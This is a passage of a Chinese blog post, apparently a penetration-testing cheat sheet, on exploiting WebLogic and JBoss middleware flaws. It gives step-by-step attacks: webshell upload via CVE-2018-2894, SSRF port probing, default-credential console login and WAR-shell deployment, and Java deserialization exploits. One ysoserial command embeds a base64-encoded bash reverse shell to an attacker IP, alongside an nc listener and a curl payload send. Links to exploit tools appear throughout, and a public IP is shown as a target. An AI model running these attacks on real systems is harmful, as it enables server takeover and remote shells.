+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623745464-6ab7bcae-6cb7-4558-a33d-3644657e3cca.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=1703&size=84889&status=done&style=none&width=851.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>受影响的 uri：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span><br><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span><br><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType11</span><br><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
+
+<p>工具：<a href="https://www.yuque.com/attachments/yuque/0/2020/jar/258143/1595916236469-a14bc4c2-1b82-4c6c-9771-67c6b466d6df.jar?_lake_card=%7B%22uid%22%3A%221589623811048-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fjar%2F258143%2F1595916236469-a14bc4c2-1b82-4c6c-9771-67c6b466d6df.jar%22%2C%22name%22%3A%22Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7V1.7.jar%22%2C%22size%22%3A1832546%2C%22type%22%3A%22%22%2C%22ext%22%3A%22jar%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22UWxca%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">Java 反序列化漏洞利用工具 V1.7.jar</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623823488-8a120b7e-ccaf-413b-bc53-2a7fdb5265f0.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=736&originWidth=986&size=96878&status=done&style=none&width=493" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="2、CVE-2019-2725"><a href="#2、CVE-2019-2725" class="headerlink" title="2、CVE-2019-2725"></a>2、CVE-2019-2725</h2><p>访问 /_async/AsyncResponseService 返回如下页面，则可能存在此漏洞。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623857530-1df94f49-4764-445e-a3bf-c554093dee7c.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1171&size=164024&status=done&style=none&width=585.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>受影响的 url：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;_async&#x2F;AsyncResponseService</span><br><span class="line">&#x2F;_async&#x2F;AsyncResponseServiceJms</span><br><span class="line">&#x2F;_async&#x2F;AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure>
+
+<p>工具：Java 反序列化漏洞利用工具 V1.7.jar<a href="https://www.yuque.com/attachments/yuque/0/2020/jar/258143/1595916236670-3aed7a9a-9e85-445e-94c2-1c2d9535fbf1.jar?_lake_card=%7B%22uid%22%3A%221589623899507-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fjar%2F258143%2F1595916236670-3aed7a9a-9e85-445e-94c2-1c2d9535fbf1.jar%22%2C%22name%22%3A%22Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7V1.7.jar%22%2C%22size%22%3A1832546%2C%22type%22%3A%22%22%2C%22ext%22%3A%22jar%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22POODf%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">Java 反序列化漏洞利用工具 V1.7.jar</a></p>
+<h2 id="3、CVE-2014-4210"><a href="#3、CVE-2014-4210" class="headerlink" title="3、CVE-2014-4210"></a>3、CVE-2014-4210</h2><h2 id="4、CVE-2018-2628CVE-2018-2628-master-zip"><a href="#4、CVE-2018-2628CVE-2018-2628-master-zip" class="headerlink" title="4、CVE-2018-2628CVE-2018-2628-master.zip"></a><a href="https://github.com/jas502n/CVE-2018-2628" target="_blank" rel="noopener">4、CVE-2018-2628<a href="https://www.yuque.com/attachments/yuque/0/2020/zip/258143/1595916236793-917aab78-dc99-42c5-8055-697fec30ac8b.zip?_lake_card=%7B%22uid%22%3A%221593338435334-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F258143%2F1595916236793-917aab78-dc99-42c5-8055-697fec30ac8b.zip%22%2C%22name%22%3A%22CVE-2018-2628-master.zip%22%2C%22size%22%3A2542325%2C%22type%22%3A%22application%2Fx-zip-compressed%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%227kPAe%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">CVE-2018-2628-master.zip</a></a></h2><h2 id="5、CVE-2018-2894"><a href="#5、CVE-2018-2894" class="headerlink" title="5、CVE-2018-2894"></a>5、CVE-2018-2894</h2><p>工具：<a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/258143/1595916236900-0a953c7d-879a-47b7-a56e-9a28b6f9d24b.zip?_lake_card=%7B%22uid%22%3A%221589623985147-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F258143%2F1595916236900-0a953c7d-879a-47b7-a56e-9a28b6f9d24b.zip%22%2C%22name%22%3A%22weblogicScanner-master.zip%22%2C%22size%22%3A98162%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22HirDM%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">weblogicScanner-master.zip</a><br><code>python3 ws.py -t 122.51.93.116:7001</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624007949-e3475c29-c743-4fad-af08-3ea7f31d559f.png#align=left&display=inline&height=385&margin=%5Bobject%20Object%5D&name=image.png&originHeight=769&originWidth=827&size=163237&status=done&style=none&width=413.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="6、CVE-2018-2894"><a href="#6、CVE-2018-2894" class="headerlink" title="6、CVE-2018-2894"></a>6、CVE-2018-2894</h2><p>访问<code>http://192.168.56.47:7001/ws_utc/config.do</code>，设置 Work Home Dir 为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。将目录设置为<code>ws_utc</code>应用的静态文件 css 目录，访问这个目录是无需权限的，这一点很重要。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624056116-9510daed-61ea-4359-b240-cd7eb9ebc2e3.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&name=image.png&originHeight=320&originWidth=1134&size=23640&status=done&style=none&width=567" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后点击安全 -&gt; 增加，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624068247-9cfa76fe-7e5c-4866-a0bb-4519ed2c3cdd.png#align=left&display=inline&height=185&margin=%5Bobject%20Object%5D&name=image.png&originHeight=369&originWidth=583&size=22481&status=done&style=none&width=291.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后上传 webshell：上传后，查看返回的数据包，其中有时间戳：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624081624-2595dfde-c520-4613-901e-fc8377a58114.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&name=image.png&originHeight=516&originWidth=1253&size=93741&status=done&style=none&width=626.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>然后访问<code>http://192.168.56.47:7001/ws_utc/css/config/keystore/1558333250831_1.jsp</code>，即可执行 webshell：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624093626-d905aa35-8e55-4902-afc4-2af4a5551a01.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=876&size=14543&status=done&style=none&width=438" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="7、CVE-2014-4210"><a href="#7、CVE-2014-4210" class="headerlink" title="7、CVE-2014-4210"></a>7、CVE-2014-4210</h2><p>影响版本：10.0.2.0, 10.3.6.0<br>1、访问 /uddiexplorer/SearchPublicRegistries.jsp，若能正常访问，则可能存在此漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624125934-d6d535a1-9b6e-4f00-a676-ce39ff7246e8.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=559&originWidth=1134&size=87944&status=done&style=none&width=567" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、填写任意内容，点击 search 以后抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624138023-5a7f3094-2a4d-4868-b77f-cd21f06c368f.png#align=left&display=inline&height=234&margin=%5Bobject%20Object%5D&name=image.png&originHeight=469&originWidth=1218&size=65728&status=done&style=none&width=609" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>3、将 post 改为 get 以后 operator 为可控参数，将其改成 http 协议端口</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624149531-34db6ebc-f24b-4145-84ba-7ec9c1435d55.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=411&originWidth=1143&size=87844&status=done&style=none&width=571.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>4、若存在开放端口即返回 error code</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624161182-6ebb2d25-8226-48d8-bcc3-3934fb627d72.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1911&size=160574&status=done&style=none&width=955.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>若开放端口为 HTTP 协议，则会返回 did not have a valid SOAP content-type。<br>访问不存在的端口 could not connect over HTTP to server</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624173973-d6473006-680d-4a09-be4d-98f83e1b6076.png#align=left&display=inline&height=208&margin=%5Bobject%20Object%5D&name=image.png&originHeight=416&originWidth=1905&size=136883&status=done&style=none&width=952.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="8、Weblogic-弱口令-amp-后台-getshell"><a href="#8、Weblogic-弱口令-amp-后台-getshell" class="headerlink" title="8、Weblogic 弱口令 &amp; 后台 getshell"></a>8、Weblogic 弱口令 &amp; 后台 getshell</h2><p>1、<a href="http://122.51.93.116:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener"><code>http://122.51.93.116:7001/console/login/LoginForm.jsp</code></a><br><code>weblogic:Oracle@123</code><br><code>各种设备弱口令：</code><a href="https://cirt.net/passwords?criteria=weblogic" target="_blank" rel="noopener"><code>https://cirt.net/passwords?criteria=weblogic</code></a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624271644-28714aaa-d80d-4d39-ba98-fa66ee69d67a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=479&originWidth=1713&size=209789&status=done&style=none&width=856.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、部署—安装—上传文件-上传 war 包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624297770-a8f049ff-41e6-4882-b63d-d196324c2585.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=1009&size=77320&status=done&style=none&width=504.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624313522-0734a6e8-113e-471e-a1ef-813985b62ac3.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=432&originWidth=741&size=45354&status=done&style=none&width=370.5" alt="image.png](https://cdn.nlark.com/yuque/0/2020/png/258143/1589624306147-1c42a5fa-cd58-4bc9-b030-5f2f42c6bcb0.png#align=left&display=inline&height=199&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=834&size=48867&status=done&style=none&width=417)![image.png" title="">
+                </div>
+                <div class="image-caption">image.png](https://cdn.nlark.com/yuque/0/2020/png/258143/1589624306147-1c42a5fa-cd58-4bc9-b030-5f2f42c6bcb0.png#align=left&display=inline&height=199&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=834&size=48867&status=done&style=none&width=417)![image.png</div>
+            </figure>
+<p>3、上传文件—-下一步—–下一步—–部署为应用程序–下一步—完成</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624345292-23e6aeef-4f92-4c0d-815d-d8bbd6f5bc05.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1053&size=66606&status=done&style=none&width=526.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624353340-606e2f05-cc7a-4e6b-a6e6-a35bf48be957.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=676&size=43939&status=done&style=none&width=338" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624361591-90370bf2-ba91-4c88-ac02-d786c3e48883.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=588&originWidth=642&size=52453&status=done&style=none&width=321" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>4、选中应用程序—-启动</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589624376941-143367fd-4532-4c68-ae40-666f552eb3ac.png#align=left&display=inline&height=279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=558&originWidth=943&size=53816&status=done&style=none&width=471.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>5、访问：<a href="http://ip:port/[war包名]/[包名内文件名]">http://ip:port/[war包名]/[包名内文件名]</a><br><code>http://122.51.93.116:7001/hacker/index.jsp</code></p>
+<h1 id="六、JBOSS"><a href="#六、JBOSS" class="headerlink" title="六、JBOSS"></a>六、JBOSS</h1><h2 id="1、CVE-2017-12149"><a href="#1、CVE-2017-12149" class="headerlink" title="1、CVE-2017-12149"></a>1、CVE-2017-12149</h2><p>访问 /invoker/readonly 返回 500，说明页面存在，此页面存在反序列化漏洞。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622936142-901ae21f-2ebc-4368-a85d-517da178520c.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=image.png&originHeight=502&originWidth=918&size=64134&status=done&style=none&width=459" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>漏洞工具：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="noopener">https://github.com/yunxu1/jboss-_CVE-2017-12149</a><br><a href="https://www.yuque.com/attachments/yuque/0/2020/zip/258143/1595916237014-7c43a12f-2984-45b5-a2f6-4c241a455474.zip?_lake_card=%7B%22uid%22%3A%221589623016279-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fzip%2F258143%2F1595916237014-7c43a12f-2984-45b5-a2f6-4c241a455474.zip%22%2C%22name%22%3A%22jboss-_CVE-2017-12149-master.zip%22%2C%22size%22%3A2332088%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22lIaM6%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">jboss-_CVE-2017-12149-master.zip</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589622963210-bf5dc6b7-fd3a-4757-9fa0-d9c8657be78f.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=image.png&originHeight=523&originWidth=577&size=26118&status=done&style=none&width=288.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="2、JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#2、JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="2、JBoss JMXInvokerServlet 反序列化漏洞"></a>2、JBoss JMXInvokerServlet 反序列化漏洞</h2><p>访问 /invoker/JMXInvokerServlet 弹出下载，说明接口开放，此接口存在反序列化漏洞。<br>1、攻击机监听<br><code>nc -nlvp 3333</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623099403-d077cbbb-83fa-4870-9f7a-0eee9725180b.png#align=left&display=inline&height=69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=137&originWidth=540&size=16676&status=done&style=none&width=270" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>2、编写反弹 shell 的命令（通过 ysoserial.jar 序列化工具生成 poc.ser）<br><a href="https://www.yuque.com/attachments/yuque/0/2020/jar/258143/1595916237162-ac64f8e3-e64b-43b5-8011-773eb3e69d47.jar?_lake_card=%7B%22uid%22%3A%221589623222472-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fjar%2F258143%2F1595916237162-ac64f8e3-e64b-43b5-8011-773eb3e69d47.jar%22%2C%22name%22%3A%22ysoserial.jar%22%2C%22size%22%3A54591561%2C%22type%22%3A%22%22%2C%22ext%22%3A%22jar%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22agzN8%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">ysoserial.jar</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>此处用的 CommonsCollections<br>上图中的<code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx</code>是<br><code>bash -i &gt;&amp; /dev/tcp/192.168.3.20/3333 0&gt;&amp;1</code>进行的 base64 编码</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623314852-53f295de-ebb1-4e46-a2b8-0860b7c3ae13.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=1221&size=79358&status=done&style=none&width=610.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>只能用 cmd 无法使用 powershell<br>3、抓包<br><code>http://192.168.3.71:8080/invoker/JMXInvokerServlet</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623374504-dda06681-90ad-4184-b7ce-8b6dba741fed.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=867&size=134544&status=done&style=none&width=433.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>4、发送 poc.ser</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623423650-b7637f71-b84f-4be5-a45e-9575e4299881.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=781&size=111089&status=done&style=none&width=390.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>5、攻击机成功反弹 shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623452147-11033e20-1b85-4dbb-8ea6-09a21f45452e.png#align=left&display=inline&height=108&margin=%5Bobject%20Object%5D&name=image.png&originHeight=216&originWidth=650&size=20601&status=done&style=none&width=325" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>或者直接通过 curl 命令<br><code>curl http://192.168.3。71:8080/invoker/readonly --data-binary poc.ser</code></p>
+<h2 id="3、JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#3、JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="3、JBoss JMXInvokerServlet 反序列化漏洞"></a>3、JBoss JMXInvokerServlet 反序列化漏洞</h2><p>直接使用<a href="https://www.yuque.com/attachments/yuque/0/2020/jar/258143/1595916237263-16ff95b0-5c35-429c-852f-d7060059ce52.jar?_lake_card=%7B%22uid%22%3A%221589623527387-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2020%2Fjar%2F258143%2F1595916237263-16ff95b0-5c35-429c-852f-d7060059ce52.jar%22%2C%22name%22%3A%22DeserializeExploit.jar%22%2C%22size%22%3A47266871%2C%22type%22%3A%22%22%2C%22ext%22%3A%22jar%22%2C%22progress%22%3A%7B%22percent%22%3A99%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%22qbqw5%22%2C%22card%22%3A%22file%22%7D" target="_blank" rel="noopener">DeserializeExploit.jar</a>工具</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623574555-ace8c330-3e68-4985-b56e-930d02c35432.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=798&size=44533&status=done&style=none&width=399" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="4、JBoss-EJBInvokerServlet-反序列化漏洞"><a href="#4、JBoss-EJBInvokerServlet-反序列化漏洞" class="headerlink" title="4、JBoss EJBInvokerServlet 反序列化漏洞"></a>4、JBoss EJBInvokerServlet 反序列化漏洞</h2><h2 id="5、CVE-2017-7504"><a href="#5、CVE-2017-7504" class="headerlink" title="5、CVE-2017-7504"></a>5、CVE-2017-7504</h2><p>访问/jbossmq-httpil/HTTPServerILServlet， 返回 This is theJBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/258143/1589623635939-70548a9b-fd9e-44d1-9c55-0a7025e6b1d4.png#align=left&display=inline&height=120&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=818&size=30461&status=done&style=none&width=409" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这里直接无法直接利用 CVE-2017-12149 生成的 poc.ser</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections1 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMjAvMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>此处用的 CommonsCollections1 生成的 poc.ser 发送到/jbossmq-httpil/HTTPServerILServlet 接口中，成功反弹 shell。<br>提醒：发送数据记得将 get 改成 post</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-07-28T06:12:37.035Z" itemprop="dateUpdated">2020-07-28 14:12:37</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2020/07/28/dlvqrg/" target="_blank" rel="external">http://yoursite.com/2020/07/28/dlvqrg/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="John Doe">
+            John Doe
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/07/28/dlvqrg/&title=《中间件漏洞》 — Hexo&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/07/28/dlvqrg/&title=《中间件漏洞》 — Hexo&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2020/07/28/dlvqrg/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《中间件漏洞》 — Hexo&url=http://yoursite.com/2020/07/28/dlvqrg/&via=http://yoursite.com" data-title=" Twitter">
